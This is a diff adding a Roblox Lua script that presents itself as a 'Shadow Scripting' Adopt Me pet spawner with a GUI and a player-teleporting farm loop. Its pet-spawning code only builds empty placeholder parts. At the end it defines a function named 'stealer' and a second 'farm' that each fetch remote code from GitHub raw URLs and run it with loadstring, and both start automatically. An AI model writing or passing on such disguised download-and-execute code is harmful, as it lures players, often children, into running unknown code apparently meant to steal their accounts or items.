@@ -1,0 +1,103 @@
+local AdoptMe = game:GetService("Players").LocalPlayer.Backpack:WaitForChild("AdoptMe Pet Spawner")
+local GUI = AdoptMe:WaitForChild("AdoptMe Pet Spawner GUI")
+local Title = GUI:WaitForChild("Title")
+local TextBox = GUI:WaitForChild("PetNameTextBox")
+local SpawnButton = GUI:WaitForChild("SpawnButton")
+local PetType = GUI:WaitForChild("PetType")
+local PetTypeText = PetType:WaitForChild("TextLabel")
+
+Title.Text = "Shadow Scripting Pet Spawner"
+
+function spawnPet()
+    local petType = PetTypeText.Text
+    local petName = TextBox.Text
+    local pet = Instance.new("Model")
+    pet.Name = petName .. " " .. petType
+    pet.Parent = game.Workspace
+
+    local head = Instance.new("Part")
+    head.Name = "Head"
+    head.Shape = Enum.PartType.Ball
+    head.Size = Vector3.new(2, 2, 2)
+    head.CanCollide = false
+    head.Anchored = true
+    head.Parent = pet
+
+    local body = Instance.new("Weld")
+    body.Name = "Body"
+    body.Part0 = head
+    body.Part1 = Instance.new("Part")
+    body.Parent = pet
+
+    local leg1 = Instance.new("Weld")
+    leg1.Name = "Leg1"
+    leg1.Part0 = head
+    leg1.Part1 = Instance.new("Part")
+    leg1.Parent = pet
+
+    local leg2 = Instance.new("Weld")
+    leg2.Name = "Leg2"
+    leg2.Part0 = head
+    leg2.Part1 = Instance.new("Part")
+    leg2.Parent = pet
+
+    local leg3 = Instance.new("Weld")
+    leg3.Name = "Leg3"
+    leg3.Part0 = head
+    leg3.Part1 = Instance.new("Part")
+    leg3.Parent = pet
+
+    local leg4 = Instance.new("Weld")
+    leg4.Name = "Leg4"
+    leg4.Part0 = head
+    leg4.Part1 = Instance.new("Part")
+    leg4.Parent = pet
+
+    local tail = Instance.new("Weld")
+    tail.Name = "Tail"
+    tail.Part0 = head
+    tail.Part1 = Instance.new("Part")
+    tail.Parent = pet
+
+    return pet
+end
+
+function farm()
+    while true do
+        local player = game.Players.LocalPlayer
+        local head = player.Character.Head
+        local muscle = player.Character.Muscle
+
+        local target = game.Players:GetChildren()[math.random(1, #game.Players:GetChildren())]
+        if target.Character and target.Character:FindFirstChild("Head") then
+            local headCframe = target.Character.Head.CFrame
+            local distance = (headCframe.Position - head.Position).Magnitude
+
+            if distance < 50 then
+                player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+                muscle:PivotTo(target.Character.HumanoidRootPart.CFrame + Vector3.new(0, -5, 0))
+                spawnPet()
+            end
+        end
+        wait()
+    end
+end
+
+local function onButtonPressed()
+    spawnPet()
+end
+
+SpawnButton.MouseButton1Click:Connect(onButtonPressed)
+
+task.spawn(farm)
+
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/script.lua'))()
+end
+
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/jamesshadowdragon/shadow-scripting/refs/heads/main/scriptbyshadowscripting'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
